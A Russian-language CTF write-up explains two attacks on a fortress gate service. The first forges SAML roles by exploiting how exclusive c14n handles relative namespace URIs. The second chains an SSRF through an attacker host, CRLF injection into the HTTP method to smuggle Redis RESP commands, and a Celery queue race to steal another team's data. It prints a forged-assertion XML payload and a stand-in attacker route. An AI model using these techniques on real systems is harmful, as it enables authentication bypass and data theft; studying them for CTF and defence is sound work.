# Ворота
**OmCTF 2026**

Сервис — пропускная система крепости. После регистрации караульный получает сессионный токен (`X-Token`) и личный SAML-пропуск. Пропуск подписывается ключом канцелярии: RSA-SHA256, exclusive c14n, трансформ enveloped-signature. Роль в честно выданном пропуске — `guest`.

Флаги лежат в двух хранилищах. Первое — депеши: `POST /dispatches` пишет текст от имени текущего инспектора, а `POST /dispatches/access` отдаёт депеши по предъявленному пропуску. Второе — записки сверки: отчёт по делу кладётся в `BriefingArtifact`, а воркер Celery потом переписывает его `summary` в заметку к делу.

## Депеши

`/dispatches/access` спрашивает у `ticketlib` уровень пропуска. Гость видит только свои депеши и только если `NameID` совпадает с позывным. Уровень коменданта (`9`) фильтр по владельцу снимает, и в ответ попадают депеши всех инспекторов:

```python
level = documents.verify(body.document)
if level < documents.ticketlib.LEVEL_GUEST:
    raise Forbidden("Недействительный пропуск.")

owner_id = None
if level < documents.ticketlib.LEVEL_COMMANDANT:
    if documents.subject(body.document) != user.callsign:
        raise Forbidden("Пропуск не принадлежит текущему инспектору.")
    owner_id = user.inspector_id

items = await dispatches.list_dispatches(db, owner_id=owner_id)
```

`list_dispatches` при `owner_id is None` не добавляет `WHERE` по владельцу.

Проверка в `ticketlib` устроена в два прохода. Сначала `xmlsec` проверяет подпись по сертификату канцелярии. Потом тот же XML отдельно разбирается библиотекой `samael` в структуру `Assertion`, и роль берётся из первого попавшегося атрибута `role`:

```rust
fn get_role_from_assertion(a: &Assertion) -> Option<String> {
    if let Some(ref stmts) = a.attribute_statements {
        for stmt in stmts {
            for attr in &stmt.attributes {
                if attr.name.as_deref() == Some("role") {
                    if let Some(first) = attr.values.first() {
                        return first.value.clone();
                    }
                }
            }
        }
    }
    None
}
```

Подпись при этом считается по exclusive c14n. Узел, на котором объявлено пространство имён с относительным URI, в канонический вид не попадает: дайджест остаётся дайджестом исходного пропуска, `xmlsec` подпись принимает. Разборщик SAML этот узел видит. Достаточно вставить перед настоящим `AttributeStatement` ещё один, с ролью `commandant` и объявлением вроде `xmlns:pass="v2"`:

```xml
<saml:AttributeStatement xmlns:pass="v2">
  <saml:Attribute Name="role">
    <saml:AttributeValue>commandant</saml:AttributeValue>
  </saml:Attribute>
</saml:AttributeStatement>
```

`/checkpoint/verify` на таком документе отвечает `"level": 9`. Тот же документ на `/dispatches/access` возвращает все депеши, включая чужие флаги. Абсолютный URI (`urn:...`) в объявлении пространства имён узел в дайджест включает, и подпись уже не сходится. Вставленный блок должен стоять раньше настоящего: читается первая роль.

Скрипт: [solve.py](solve.py). Хост передаётся первым аргументом, по умолчанию `127.0.0.1:7777`.

## Записки сверки

Второй флаг чекер кладёт не в депешу, а в отчёт сверки. `POST /incidents/{id}/request-corroboration` принимает заголовок `X-Report-Route`. Воркер по этому значению забирает зашифрованное описание следующего запроса. Если строка начинается с `/`, она остаётся путём на своём хосте. Иначе она дописывается к имени хоста из `KPP_REGISTRY_URL_PREFIX`:

```python
suffix_host, separator, suffix_path = report_route_url.partition("/")
host = idna.encode(
    f"{prefix.hostname}{domain_suffix}",
    uts46=True,
    std3_rules=True,
).decode("ascii")
```

Префикс в бою — `http://web:8000`. Заголовок `.attacker.tld:18102/route.json` превращается в запрос на `web.attacker.tld:18102`. Ответ — JSON с полями `nonce` и `payload`, AES-GCM. Ключ выводится из эпохи старта процесса. Эпоха читается с `GET /internal/health`: заголовки `Date` и `X-Process-Uptime`, разность и есть секунда запуска, от неё считается тот же ключ, что у воркера.

Расшифрованный объект содержит `method` и `url`. Воркер отправляет их как есть. Для своего ящика канцелярии он ещё прикладывает HMAC, для любого другого адреса — нет:

```python
report_request = Request(
    method,
    destination.encode("utf-8"),
    report_headers,
)
```

`method` длиной до 512 байт и может содержать `\r\n`. Запрос на `http://redis:6379/` с методом

```text
GET\r\n
*3\r\n$6\r\nSCRIPT\r\n$4\r\nLOAD\r\n...
```

уходит в Redis как RESP. ACL пользователя `default` пускает `SCRIPT LOAD` и `EVALSHA` и режет ключи маской `kpp7:tasks:*`. Очередь Celery — список `kpp7:tasks:reports`.

Задача `gate.reports.corroborate` по `artifact_id` читает `BriefingArtifact` без проверки владельца и пишет `summary` в заметку к делу:

```python
content = await get_briefing(db, artifact_id)
report = json.loads(content)
note = f"Сверка межведомственного источника: {report.get('summary', '')}"
```

Чужой `artifact_id` чекер публикует в attack data. Дальше гонка на единственном воркере (`concurrency=1`, `prefetch=1`):

1. `SCRIPT LOAD` скрипта, который делает `LPUSH` в очередь.
2. `EVALSHA` забивает список сотнями сообщений Celery, чтобы живой воркер не разгрёб голову сразу.
3. Легитимный `request-corroboration` кладёт в очередь настоящую задачу и строку в `ReportHandoff` (её задача обязана найти, иначе заметка не пишется).
4. `LSET kpp7:tasks:reports 0` подменяет эту задачу: тот же `incident_id` и `request_id`, но `artifact_id` жертвы.

Заметка к нашему делу приходит с чужим `summary`. Это флаг второго хранилища. `POST /briefings/access` тут не помогает: документ в нём не проверяется, выборка и так ограничена `owner_id` текущего инспектора.

#web #saml #xml #ssrf #redis #race
